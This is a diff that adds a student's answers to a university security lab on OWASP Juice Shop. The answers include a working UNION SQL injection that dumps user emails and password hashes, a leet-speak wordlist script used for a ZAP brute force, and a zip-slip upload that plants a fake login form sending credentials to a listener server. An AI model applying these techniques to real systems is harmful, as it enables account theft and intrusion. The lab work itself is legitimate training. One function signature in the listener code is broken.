@@ -271,6 +271,8 @@ __What user did you login as?__
 
 The admin. Looks like bypassing the credentials logs in as the first entry in the database which happens to be the admin account with id of 1.
 
+![image](https://user-images.githubusercontent.com/71127573/190845151-4a6704a5-3631-43ad-a26f-096ddc5a2ffd.png)
+
 
 
 ---
@@ -409,7 +411,25 @@ You can guess this if you want to, but the column amount can also be found in th
 
 __What SQL command did you use?__
 
+``` sql
+1')) UNION SELECT email, password, 3, 4, 5, 6, 7, 8 FROM users--
+```
+
+Full URL:
+```
+http://localhost:3000/rest/products/search?q=1')) UNION SELECT email, password, 3, 4, 5, 6, 7, 8 FROM users--
+```
+
 __Explain shortly the logic behind your attack. Why and how does it work?__
+
+`1'` at the start is to not return any products because none of them have 1 in the name, so that the response neatly returns only user data. `))` is again to fix the parentheses. `UNION` combines results from two tables. Email and passwords were the fields we were interested in, and the numbers in the `SELECT` clause are to match the number of columns in the product table, to get around the `SELECTs to the left and right of UNION do not have the same number of result columns` error. `users` is the easily guessable name of the user table.
+
+Thus, the user emails and password hashes are returned under `id` and `name` of the products table:
+
+![image](https://user-images.githubusercontent.com/71127573/190845981-50287477-d799-4c3d-a4c4-e42714ad4a6d.png)
+
+
+
 
 ---
 
@@ -456,9 +476,104 @@ You can use any tools you find online. If you want to, you can code your own mut
 
 #### Returns
 
-* Wordlist
-* Any code you created.
-* Detailed description of how you created the wordlist and how you did the brute force attack.
+* **Wordlist**
+
+Included in this repository:
+
+https://github.com/CompSec-2022/computer-security-521155s-2022-returns-VilleKylmamaa/blob/master/Lab2Template/wordlist.txt
+
+
+* **Any code you created**.
+
+Python script to generate all leet speak and upper/lower case permutations to a file from a user input. I got the leet speak part from https://www.reddit.com/r/AskNetsec/comments/338s94/creating_a_leet_speak_dictionary_when_given_a/ from user aydiosmio's pastebin, and added the upper/lower case permutations myself.
+
+```python
+import itertools
+
+SUBS = {
+    "a":"4",
+    "b":"8",
+    "c":"",
+    "d":"",
+    "e":"3",
+    "f":"",
+    "g":"6",
+    "h":"",
+    "i":"",
+    "j":"",
+    "k":"",
+    "l":"1",
+    "m":"",
+    "n":"",
+    "o":"0",
+    "p":"",
+    "q":"",
+    "r":"",
+    "s":"5",
+    "t":"7",
+    "u":"",
+    "v":"",
+    "w":"",
+    "x":"",
+    "y":"",
+    "z":""
+}
+ 
+def leet_gen(words):
+    
+    def iter_word(word):
+        if word:
+            ch = word[0]
+            for rest in iter_word(word[1:]):
+                yield ch + rest
+            for ch in SUBS.get(ch.lower(), []):
+                for rest in iter_word(word[1:]):
+                    yield ch + rest
+        else:
+            yield ""
+        
+    for word in words:
+        for tmp in iter_word(word):
+            yield tmp
+ 
+if __name__ == "__main__":
+        
+    import sys
+    words = (line.strip() for line in sys.stdin)
+    file = open("wordlist.txt", "a")
+
+    # Generate 1336 5p34k permutations
+    for leet in leet_gen(words):
+        wordList = []
+
+        # Generate upper and lower case permutations
+        randomizedCaseList = list(map(''.join, itertools.product(*zip(leet.upper(), leet.lower()))))
+        for word in randomizedCaseList:
+            wordList.append(word)
+
+        # Remove duplicates
+        wordList = set(wordList)
+        wordList = list(set(wordList))
+        
+        for word in wordList:
+            file.write(word + "\n")
+    
+    file.close()
+```
+
+* **Detailed description of how you created the wordlist and how you did the brute force attack**.
+
+
+I created the wordlist with the above Python script. It's not particularly efficient but it is what I got working the quickest to get the job done.
+
+I used OWASP Zap to generate some POST requests with the automated scan to figure how to send POST requests to muumitalo. Then I used Zap's Fuzzer attack tool to quickly send in the ~21k vaapukkamehu permutations. I sorted the list by the code to find the single 200 response to find the right permutation: V4APukkAM3hU:
+
+![image](https://user-images.githubusercontent.com/71127573/190902243-2c26e768-eaed-4180-82cd-9a79f0f07f9b.png)
+
+![image](https://user-images.githubusercontent.com/71127573/190903117-38a8966d-a509-4f83-a1e6-74ad36261b29.png)
+
+
+
 
 <details>
 <summary>Hint</summary>
@@ -473,6 +588,8 @@ Send a POST request manually to your target using the Manual request editor in T
 
 Highlight the part of the request that you want to modify in the attack and add it as a fuzzing location. Add the wordlist file as the payload for that specific fuzzing location and start the attack.
 </details>
+
+
 
 ---
 
@@ -543,6 +660,132 @@ video.style.visibility = 'hidden';
 * Your own HTML/Javascript **without directory traversal characters in its name**.
 * The *zip* archive that you uploaded to overwrite the subtitle file.
 * **Clear** instructions on how to start your own server, send the XSS attack, and how to verify that the information was sent to your server from Juice Shop.
+
+
+
+
+First I found the location of the video from the content-header on localhost:3000/video: `/assets/public/videos/JuiceShopJingle.mp4`.
+
+![image](https://user-images.githubusercontent.com/71127573/190950973-687284a4-20cb-4f1d-9132-7d860df85f74.png)
+
+I found the subtitles by just changing the file extension: `/assets/public/videos/JuiceShopJingle.vtt`.
+
+![image](https://user-images.githubusercontent.com/71127573/190951124-7c615ec1-7d9c-4b1b-951f-201ef2e969da.png)
+
+
+
+
+In order to catch POST requests, I set up a simple Python BaseHTTPServer. The source of the code is this GitHub discussion: https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7. I have also uploaded the code here in this repository: https://github.com/CompSec-2022/computer-security-521155s-2022-returns-VilleKylmamaa/blob/master/Lab2Template/simple-python-server.py:
+
+```python
+#! /usr/bin/env python3
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import logging
+import sys
+
+COLOR = "\033[1;32m"
+RESET_COLOR = "\033[00m"
+
+class S(BaseHTTPRequestHandler):
+    def _set_response(self):
+        self.send_response(200)
+        self.send_header('Content-type', 'text/html')
+        self.end_headers()
+
+    def do_log(self, method):
+        content_length = self.headers['Content-Length']
+        content_length = 0 if (content_length is None) else int(content_length)
+        post_data = self.rfile.read(content_length)
+        logging.info(COLOR + method + " request,\n" + RESET_COLOR + "Path: %s\nHeaders:\n%sBody:\n%s\n",
+                str(self.path), str(self.headers), post_data.decode('utf-8'))
+        self._set_response()
+        self.wfile.write((method + " request for {}".format(self.path)).encode('utf-8'))
+
+    def do_GET(self):
+        self.do_log("GET")
+
+    def do_POST(self):
+        self.do_log("POST")
+
+    def do_PUT(self):
+        self.do_log("PUT")
+
+    def do_DELETE(self):
+        self.do_log("DELETE")
+
+def run(
+, port, server_class=HTTPServer, handler_class=S):
+    logging.basicConfig(level=logging.INFO)
+    server_address = (address, port)
+    httpd = server_class(server_address, handler_class)
+    logging.info('Starting server...\n')
+    try:
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        pass
+    httpd.server_close()
+    logging.info('Stopping server...\n')
+
+if __name__ == '__main__':
+    if len(sys.argv) != 3:
+        print("Usage:\n" + sys.argv[0] + " [address] [port]")
+        sys.exit(1)
+
+    run(sys.argv[1], int(sys.argv[2]))
+```
+
+The Python script takes in address and port as arguments when ran. The address can simply be an empty string `""`, and the port should be `8000` to match the target port of the attack:
+
+![image](https://user-images.githubusercontent.com/71127573/191077018-c51b03f2-271c-4e96-8ce4-ba466161e35c.png)
+
+
+To make the faux log in form look like the real one, I simply copied the whole HTML code from the original login page, including all the imports from the `<head>`. Some things were off slightly too much, so I added some CSS. The file starts with a `</script>` tag, and the JavaScript at the end of the file to hide the video starts with a `<script>` tag but doesn't end with a `</script>` tag because it gets injected to the place where the subtitles would be.
+
+The HTML/JavaScript I is smuggled to the `/promotion` page is uploaded here in this repository: 
+
+https://github.com/CompSec-2022/computer-security-521155s-2022-returns-VilleKylmamaa/blob/master/Lab2Template/JuiceShopJingle.vtt
+
+I am not pasting it here because of its length. It's not perfect, but quite good for a quick work:
+
+![image](https://user-images.githubusercontent.com/71127573/191071652-feb42ece-4950-4703-a33a-90d5c6c8a0fd.png)
+
+The form is set up to send a POST request containing the input data from the form to localhost port 8000: `<form action="http://0.0.0.0:8000/" method="post" ...`, where the Python server is running.
+
+
+
+To exploit the zip slip vulnerability, I set the file in the folder `../../frontend/dist/frontend/assets/public/videos/JuiceShopJingle.vtt`, and then turned it into a zip file by running `sudo zip payload.zip ../../frontend/dist/frontend/assets/public/videos/JuiceShopJingle.vtt` in the terminal:
+
+![image](https://user-images.githubusercontent.com/71127573/191073317-7397bf66-312f-4ae3-900f-d594ce214e30.png)
+
+Since the file is named as such, it will replace the original `JuiceShopJingle.vtt` which contained the subtitles.
+
+The zip file is also uploaded here in this repository:
+
+https://github.com/CompSec-2022/computer-security-521155s-2022-returns-VilleKylmamaa/blob/master/Lab2Template/payload.zip
+
+Logged in as the admin, I send this file in through the complaint form:
+
+![image](https://user-images.githubusercontent.com/71127573/191073555-9d318768-afb8-4c8b-895a-ab39053eec5f.png)
+
+
+
+
+Finally, the payoff. Using the injected faux form in the Juice Shop gives me this on the Python server:
+
+![image](https://user-images.githubusercontent.com/71127573/191075759-74bed99e-c5f0-4848-9fe8-8c7b509f4c87.png)
+
+There, the given email and password are shown in the printed out data of the body: `email=admin%40juiceshop.com&password=hunter2`, and I know that the information was sent from the Juice Shop by the printed out headers: `Origin: http://localhost:3000`.
+
+
+
+
+
+
+
+
+
+
+
 
 ---
 
